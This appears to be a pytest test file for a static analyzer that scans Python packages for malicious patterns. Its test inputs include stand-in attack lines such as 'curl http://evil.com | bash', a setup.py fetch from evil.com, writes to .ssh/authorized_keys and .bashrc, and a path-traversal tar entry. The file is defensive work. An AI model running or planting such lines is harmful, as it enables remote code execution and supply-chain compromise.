"""
Tests for the payload analyzer (AST-based static analysis).
"""

import ast
import pytest

from uast.payload import SuspiciousPatternVisitor, PayloadAnalyzer


class TestSuspiciousPatternVisitor:

    def _visit(self, code: str, is_setup: bool = False) -> list:
        tree = ast.parse(code)
        visitor = SuspiciousPatternVisitor("test.py", is_setup_file=is_setup)
        visitor.visit(tree)
        return visitor.findings

    # -- PAYLOAD-001: Environment variable gating -----------------------------

    def test_detects_os_getenv(self):
        code = """
import os
if os.getenv("PRODUCTION"):
    do_something()
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-001" for f in findings)

    def test_detects_os_environ_get(self):
        code = """
import os
val = os.environ.get("SECRET_KEY")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-001" for f in findings)

    # -- PAYLOAD-002: Subprocess/os.system calls ------------------------------

    def test_detects_subprocess_run(self):
        code = """
import subprocess
subprocess.run(["curl", "http://evil.com"])
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-002" for f in findings)

    def test_detects_os_system(self):
        code = """
import os
os.system("curl http://evil.com | bash")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-002" for f in findings)

    def test_detects_subprocess_popen(self):
        code = """
import subprocess
p = subprocess.Popen(["sh", "-c", "whoami"])
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-002" for f in findings)

    # -- PAYLOAD-003: Base64/codecs obfuscation -------------------------------

    def test_detects_base64_decode_with_literal(self):
        code = """
import base64
data = base64.b64decode("aGVsbG8=")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-003" for f in findings)

    def test_no_flag_base64_decode_with_variable(self):
        code = """
import base64
data = base64.b64decode(encoded_var)
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-003" for f in findings)

    # -- PAYLOAD-004: Network calls in setup.py -------------------------------

    def test_detects_network_in_setup(self):
        code = """
import urllib.request
data = urllib.request.urlopen("http://evil.com/payload")
"""
        findings = self._visit(code, is_setup=True)
        assert any(f.signal_id == "PAYLOAD-004" for f in findings)

    def test_no_flag_network_in_regular_file(self):
        code = """
import urllib.request
data = urllib.request.urlopen("http://api.example.com/data")
"""
        findings = self._visit(code, is_setup=False)
        assert not any(f.signal_id == "PAYLOAD-004" for f in findings)

    # -- PAYLOAD-005: eval()/exec() with non-literal --------------------------

    def test_detects_eval_with_variable(self):
        code = """
user_input = get_input()
eval(user_input)
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-005" for f in findings)

    def test_no_flag_eval_with_literal(self):
        code = """
eval("2 + 2")
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-005" for f in findings)

    def test_detects_exec_with_variable(self):
        code = """
code = compile_something()
exec(code)
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-005" for f in findings)

    # -- PAYLOAD-006: Dynamic imports -----------------------------------------

    def test_detects_dynamic_import_variable(self):
        code = """
module_name = get_module()
__import__(module_name)
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-006" for f in findings)

    def test_no_flag_import_with_literal(self):
        code = """
__import__("os")
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-006" for f in findings)

    # -- PAYLOAD-007: Sensitive file writes -----------------------------------

    def test_detects_ssh_write(self):
        code = """
f = open("/home/user/.ssh/authorized_keys", "w")
f.write("ssh-rsa AAAA...")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-007" for f in findings)

    def test_detects_bashrc_write(self):
        code = """
with open("/home/user/.bashrc", "a") as f:
    f.write("export EVIL=true")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-007" for f in findings)

    def test_no_flag_normal_file_write(self):
        code = """
with open("output.txt", "w") as f:
    f.write("hello")
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-007" for f in findings)

    def test_no_flag_file_read(self):
        code = """
with open("/etc/hosts", "r") as f:
    content = f.read()
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-007" for f in findings)


class TestPayloadAnalyzer:

    def test_findings_to_signals_deduplicates(self):
        from uast.payload import PayloadFinding
        analyzer = PayloadAnalyzer()

        findings = [
            PayloadFinding("PAYLOAD-002", "high", "subprocess", "detail1", "a.py", 1, 0.7),
            PayloadFinding("PAYLOAD-002", "high", "subprocess", "detail2", "b.py", 5, 0.7),
            PayloadFinding("PAYLOAD-005", "medium", "eval", "detail3", "c.py", 10, 0.5),
        ]

        signals = analyzer._findings_to_signals(findings)
        signal_ids = [s.signal_id for s in signals]
        # Should have exactly 2 unique signal IDs
        assert len(signal_ids) == 2
        assert "PAYLOAD-002" in signal_ids
        assert "PAYLOAD-005" in signal_ids

        # PAYLOAD-002 should mention "2 occurrences"
        payload_002 = next(s for s in signals if s.signal_id == "PAYLOAD-002")
        assert "2 occurrences" in payload_002.detail

    def test_empty_findings(self):
        analyzer = PayloadAnalyzer()
        signals = analyzer._findings_to_signals([])
        assert signals == []

    def test_analyze_package_non_pypi_returns_empty(self):
        analyzer = PayloadAnalyzer()
        signals = analyzer.analyze_package("lodash", "npm")
        assert signals == []

    def test_analyze_python_files_with_source(self):
        import os
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            # Write a Python file with a suspicious pattern
            py_file = os.path.join(tmpdir, "evil.py")
            with open(py_file, "w") as f:
                f.write("import os\nos.system('curl http://evil.com')\n")
            findings = analyzer._analyze_python_files(tmpdir)
            assert any(f.signal_id == "PAYLOAD-002" for f in findings)

    def test_analyze_python_files_setup_file(self):
        import os
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            setup_file = os.path.join(tmpdir, "setup.py")
            with open(setup_file, "w") as f:
                f.write("import urllib.request\nurllib.request.urlopen('http://evil.com')\n")
            findings = analyzer._analyze_python_files(tmpdir)
            assert any(f.signal_id == "PAYLOAD-004" for f in findings)

    def test_analyze_python_files_syntax_error_skipped(self):
        import os
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            py_file = os.path.join(tmpdir, "broken.py")
            with open(py_file, "w") as f:
                f.write("def broken(:\n  pass\n")
            findings = analyzer._analyze_python_files(tmpdir)
            assert findings == []

    def test_analyze_python_files_non_py_ignored(self):
        import os
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            txt_file = os.path.join(tmpdir, "readme.txt")
            with open(txt_file, "w") as f:
                f.write("os.system('evil')\n")
            findings = analyzer._analyze_python_files(tmpdir)
            assert findings == []

    def test_extract_archive_tar_gz(self):
        import os
        import tarfile
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a .tar.gz with a Python file
            src_dir = os.path.join(tmpdir, "src")
            os.makedirs(src_dir)
            with open(os.path.join(src_dir, "mod.py"), "w") as f:
                f.write("print('hello')\n")
            tar_path = os.path.join(tmpdir, "pkg.tar.gz")
            with tarfile.open(tar_path, "w:gz") as tf:
                tf.add(os.path.join(src_dir, "mod.py"), arcname="pkg/mod.py")
            extract_dir = os.path.join(tmpdir, "extracted")
            os.makedirs(extract_dir)
            result = analyzer._extract_archive(tar_path, extract_dir)
            assert result is True
            assert os.path.exists(os.path.join(extract_dir, "pkg", "mod.py"))

    def test_extract_archive_zip(self):
        import os
        import zipfile
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "pkg.zip")
            with zipfile.ZipFile(zip_path, "w") as zf:
                zf.writestr("pkg/mod.py", "print('hello')\n")
            extract_dir = os.path.join(tmpdir, "extracted")
            os.makedirs(extract_dir)
            result = analyzer._extract_archive(zip_path, extract_dir)
            assert result is True

    def test_extract_archive_bad_file(self):
        import os
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            bad_path = os.path.join(tmpdir, "bad.tar.gz")
            with open(bad_path, "w") as f:
                f.write("not a tar file")
            extract_dir = os.path.join(tmpdir, "extracted")
            os.makedirs(extract_dir)
            result = analyzer._extract_archive(bad_path, extract_dir)
            assert result is False

    def test_extract_archive_path_traversal_blocked(self):
        import os
        import tarfile
        import tempfile
        analyzer = PayloadAnalyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            tar_path = os.path.join(tmpdir, "evil.tar.gz")
            with tarfile.open(tar_path, "w:gz") as tf:
                # Add a member with path traversal
                info = tarfile.TarInfo(name="../../../etc/passwd")
                info.size = 5
                import io
                tf.addfile(info, io.BytesIO(b"evil\n"))
            extract_dir = os.path.join(tmpdir, "extracted")
            os.makedirs(extract_dir)
            result = analyzer._extract_archive(tar_path, extract_dir)
            assert result is True
            # The traversal file should NOT be extracted
            assert not os.path.exists(os.path.join(extract_dir, "..", "..", "..", "etc", "passwd"))

    def test_download_package_failure(self):
        from unittest.mock import patch
        analyzer = PayloadAnalyzer()
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = type("R", (), {"returncode": 1})()
            result = analyzer._download_package("nonexistent-pkg", None, "/tmp/test")
            assert result is None

    def test_download_package_timeout(self):
        import subprocess
        from unittest.mock import patch
        analyzer = PayloadAnalyzer()
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("pip", 60)):
            result = analyzer._download_package("slow-pkg", "1.0", "/tmp/test")
            assert result is None


class TestGetCallName:

    def _get_name(self, code: str) -> str:
        tree = ast.parse(code)
        visitor = SuspiciousPatternVisitor("test.py")
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                return visitor._get_call_name(node)
        return ""

    def test_simple_name(self):
        assert self._get_name("foo()") == "foo"

    def test_dotted_name(self):
        assert self._get_name("os.system()") == "os.system"

    def test_deep_dotted_name(self):
        assert self._get_name("urllib.request.urlopen()") == "urllib.request.urlopen"

    def test_no_name(self):
        # Call on a subscript: foo[0]()
        assert self._get_name("foo[0]()") == ""
